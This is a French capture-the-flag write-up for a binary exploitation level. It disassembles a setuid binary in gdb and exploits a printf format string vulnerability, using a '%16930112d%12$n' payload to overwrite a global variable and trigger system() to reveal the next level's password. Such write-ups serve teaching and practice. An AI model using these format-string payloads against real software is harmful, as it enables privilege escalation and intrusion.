# Level4

> login:password -> *`level4:b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`*
```
:~$ su level4
Password:b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
---

```
:~$ pwd
/home/user/level4
```

```
:~$ ls -la
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level4
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
```

Le Home contient un binaire `level4` :

```
:~$ ./level4
(input) test
test

:~$ ./level4 test
(input) test
test
```

Avec ou sans paramètre, le binaire attends un input

```
:~$ gdb level4
...

(gdb) disas main
Dump of assembler code for function main:
   (...)
   0x080484ad <+6>:	    call   0x8048457 <n>
   (...)
End of assembler dump.

(gdb) disas n
Dump of assembler code for function n:
   (...)
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
   0x0804847f <+40>:	lea    -0x208(%ebp),%eax
   0x08048485 <+46>:	mov    %eax,(%esp)
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    0x8049810,%eax
   0x08048492 <+59>:	cmp    $0x1025544,%eax
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	movl   $0x8048590,(%esp)
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave  
   (...)
End of assembler dump.

(gdb) disas p
Dump of assembler code for function p:
   0x08048444 <+0>:	    push   %ebp
   0x08048445 <+1>:	    mov    %esp,%ebp
   0x08048447 <+3>:	    sub    $0x18,%esp
   0x0804844a <+6>:	    mov    0x8(%ebp),%eax
   0x0804844d <+9>:	    mov    %eax,(%esp)
   0x08048450 <+12>:	call   0x8048340 <printf@plt>
   0x08048455 <+17>:	leave  
   0x08048456 <+18>:	ret    
End of assembler dump.

(gdb) info variables
All defined variables:

Non-debugging symbols:
(...)
0x08049810  m
```

On remarque que le main du binaire appel une fonction `n()` (+6) et que cette derniere appelle plusieurs fonctions dont une autre fonction `p()` (+49) et une fonction `system()` (+73).

Cette fonction `p()` appelera par contre une nouvelle fois une fonction `printf()` (+12) vulnerable comme dans le level precedent.

On voit aussi dans `n()` une comparaison `cmp` (+59) de `16930116` avec une variable globale `0x8049810` nomme `m` et on va donc faire en sorte d'utiliser a nouveau la vulnerabilite de `printf()` pour en trouver sa valeur avec plusieurs `%x` qui affichera directement l'adresse.

```
:~$ echo "%x %x %x %x %x %x %x %x %x %x %x %x" | ./level4
b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 25207825
:~$ echo "aaaa %x %x %x %x %x %x %x %x %x %x %x %x" | ./level4
aaaa b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 61616161
```

Notre buffer apparait cette fois en 12e position, on tente de nouveau notre technique precedente avec la valeur `16930112` (16930116 - 4)

```
:~$ python -c 'print "\x10\x98\x04\x08" + "%12$x"' | ./level4
8049810

:~$ python -c 'print "\x10\x98\x04\x08" + "a" * 16930112 + "%12$n"' | ./level4
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaTraceback (most recent call last):
  File "<string>", line 1, in <module>
IOError: [Errno 32] Broken pipe
```

On rencontre un blocage parce que notre nombre a comparer est trop grand. On va du coup utiliser un petit changement dans notre methode et utiliser le modifier `%d` avec le `%n` pour generer notre nombre de bytes

```
:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' | ./level4
    (...)
    0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

Le flag est donne directement, c'est parce que `system()` ecrit de lui meme un `/bin/cat /home/user/level5/.pass`